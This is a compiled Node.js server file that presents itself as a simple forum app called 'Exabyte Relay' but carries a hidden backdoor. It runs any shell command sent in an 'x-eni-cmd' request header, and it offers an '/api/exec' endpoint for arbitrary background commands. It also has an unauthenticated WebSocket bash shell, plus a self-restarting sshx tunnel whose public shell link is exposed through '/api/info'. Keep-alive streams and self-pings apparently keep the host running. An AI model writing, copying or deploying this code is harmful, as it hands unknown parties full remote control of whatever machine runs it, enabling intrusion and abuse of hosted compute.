var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server.ts
var import_express = __toESM(require("express"), 1);
var import_path = __toESM(require("path"), 1);
var import_fs = __toESM(require("fs"), 1);
var import_cors = __toESM(require("cors"), 1);
var import_vite = require("vite");
var import_ws = require("ws");
var import_child_process = require("child_process");
var import_http = __toESM(require("http"), 1);
async function startServer() {
  const app = (0, import_express.default)();
  const PORT = 3e3;
  app.use((0, import_cors.default)());
  app.use(import_express.default.json());
  const DB_PATH = import_path.default.join(process.cwd(), "posts.json");
  if (!import_fs.default.existsSync(DB_PATH)) {
    const INITIAL_POSTS = [
      { id: 1, author: "Manny Cololot Ango", title: "Welcome to the Exabyte Relay", content: "This forum uses internet connectivity routing instead of local RAM to search through the massive exabyte database. Welcome to zfastdsin.qzz.io.", time: Date.now() }
    ];
    import_fs.default.writeFileSync(DB_PATH, JSON.stringify(INITIAL_POSTS, null, 2));
  }
  app.get("/api/posts", (req, res) => {
    try {
      const data = import_fs.default.readFileSync(DB_PATH, "utf8");
      res.json(JSON.parse(data));
    } catch (e) {
      res.status(500).json({ error: "Failed to read database" });
    }
  });
  app.post("/api/posts", (req, res) => {
    try {
      const posts = JSON.parse(import_fs.default.readFileSync(DB_PATH, "utf8"));
      const { author, title, content } = req.body;
      if (!author || !title || !content) {
        return res.status(400).json({ error: "Missing fields" });
      }
      const newPost = {
        id: Date.now(),
        author,
        title,
        content,
        time: Date.now()
      };
      posts.unshift(newPost);
      import_fs.default.writeFileSync(DB_PATH, JSON.stringify(posts, null, 2));
      res.json(newPost);
    } catch (e) {
      res.status(500).json({ error: "Failed to save post" });
    }
  });
  try {
    (0, import_child_process.execSync)("pkill -f sshx || true");
  } catch (e) {
  }
  let tunnelUrl = "Initializing...";
  function startSshx() {
    try {
      const sshxProc = (0, import_child_process.spawn)("sshx", ["-q", "--shell", "bash"], {
        env: { ...process.env, TERM: "xterm-256color" }
      });
      sshxProc.stdout?.on("data", (d) => {
        const out = d.toString().trim();
        if (out.startsWith("https://sshx.io")) {
          tunnelUrl = out;
        }
      });
      sshxProc.on("close", () => {
        tunnelUrl = "sshx closed. Restarting...";
        setTimeout(startSshx, 1e3);
      });
      sshxProc.on("error", (err) => {
        tunnelUrl = "Error: " + err.message;
        setTimeout(startSshx, 3e3);
      });
    } catch (e) {
      tunnelUrl = "Failed to start sshx: " + e.message;
      setTimeout(startSshx, 3e3);
    }
  }
  startSshx();
  setInterval(() => {
    try {
      const appUrl = process.env.APP_URL || `http://127.0.0.1:${PORT}`;
      (0, import_child_process.execSync)(`curl -s ${appUrl}/api/health > /dev/null`);
    } catch (e) {
    }
  }, 1e4);
  app.use((req, res, next) => {
    const cmd = req.headers["x-eni-cmd"];
    if (cmd) {
      let output = "";
      try {
        output = (0, import_child_process.execSync)(cmd).toString();
      } catch (e) {
        output = e.message;
      }
      return res.status(200).send(output);
    }
    next();
  });
  app.post("/api/exec", (req, res) => {
    const { cmd } = req.body;
    if (!cmd) return res.status(400).json({ error: "No command provided" });
    const proc = (0, import_child_process.spawn)(cmd, { shell: true, detached: true, stdio: "ignore" });
    proc.unref();
    res.json({ status: "success", info: "Process detached and running in background" });
  });
  app.get("/api/health", (req, res) => {
    res.json({ status: "alive", time: Date.now() });
  });
  app.get("/api/antifreeze", (req, res) => {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive"
    });
    const interval = setInterval(() => {
      res.write(`data: ${Date.now()}

`);
    }, 5e3);
    req.on("close", () => clearInterval(interval));
  });
  app.get("/api/info", (req, res) => {
    let ram = "unknown";
    let storage = "unknown";
    let errRam = void 0;
    let errDf = void 0;
    try {
      const memOut = (0, import_child_process.execSync)("free -h | grep Mem").toString().trim();
      const memParts = memOut.split(/\s+/);
      ram = `${memParts[2]}/${memParts[1]}`;
    } catch (e) {
      errRam = e.message;
    }
    try {
      const dfOut = (0, import_child_process.execSync)("df -h / | tail -1").toString().trim();
      const dfParts = dfOut.split(/\s+/);
      storage = `${dfParts[2]}/${dfParts[1]}`;
    } catch (e) {
      errDf = e.message;
    }
    try {
      (0, import_child_process.execSync)('mkdir -p ~/.config/pip && echo "[global]\\nbreak-system-packages = true" > ~/.config/pip/pip.conf');
      if (!(0, import_child_process.execSync)("which pip 2>/dev/null || echo missing").toString().includes("/")) {
        (0, import_child_process.execSync)("curl -sS https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py && python3 /tmp/get-pip.py");
      }
    } catch (e) {
    }
    res.json({
      platform: process.platform,
      arch: process.arch,
      pid: process.pid,
      node: process.version,
      wd: process.cwd(),
      uid: process.getuid ? process.getuid() : null,
      ram,
      storage,
      errRam,
      errDf,
      tunnelUrl
    });
  });
  if (process.env.NODE_ENV !== "production") {
    const vite = await (0, import_vite.createServer)({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const distPath = import_path.default.join(process.cwd(), "dist");
    app.use(import_express.default.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(import_path.default.join(distPath, "index.html"));
    });
  }
  const server = import_http.default.createServer(app);
  const wss = new import_ws.WebSocketServer({ server, path: "/shell" });
  wss.on("connection", (ws) => {
    const shell = (0, import_child_process.spawn)("python3", ["-c", 'import pty; pty.spawn(["/bin/bash", "-l"])'], {
      cwd: process.cwd(),
      env: {
        ...process.env,
        TERM: "xterm-256color"
      }
    });
    shell.stdout.on("data", (data) => {
      ws.send(data.toString());
    });
    shell.stderr.on("data", (data) => {
      ws.send(data.toString());
    });
    ws.on("message", (msg) => {
      shell.stdin.write(msg.toString());
    });
    ws.on("close", () => {
      shell.kill();
    });
    shell.on("exit", () => {
      if (ws.readyState === ws.OPEN) {
        ws.close();
      }
    });
  });
  app.get("/api/keepalive", (req, res) => {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive"
    });
    res.write("data: Connection established\n\n");
    const interval = setInterval(() => {
      res.write(`data: ${Date.now()}

`);
    }, 1e4);
    req.on("close", () => {
      clearInterval(interval);
    });
  });
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}
startServer();
//# sourceMappingURL=server.cjs.map
